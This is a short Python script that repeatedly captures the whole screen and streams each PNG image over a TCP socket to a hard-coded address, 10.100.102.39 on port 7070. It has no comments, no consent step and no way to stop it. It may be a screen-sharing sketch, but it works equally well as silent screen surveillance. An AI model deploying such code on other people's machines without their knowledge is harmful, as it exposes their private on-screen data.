from PIL import ImageGrab
import socket
import io

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 7070
s.connect(('10.100.102.39', port))

while True:
    screen_shot = ImageGrab.grab()

    screen_shot_byte = io.BytesIO()
    screen_shot.save(screen_shot_byte, format='PNG')
    bytes = screen_shot_byte.getvalue()
    data_len = len(bytes)

    s.sendall(data_len.to_bytes(4, byteorder='big'))
    s.sendall(bytes)

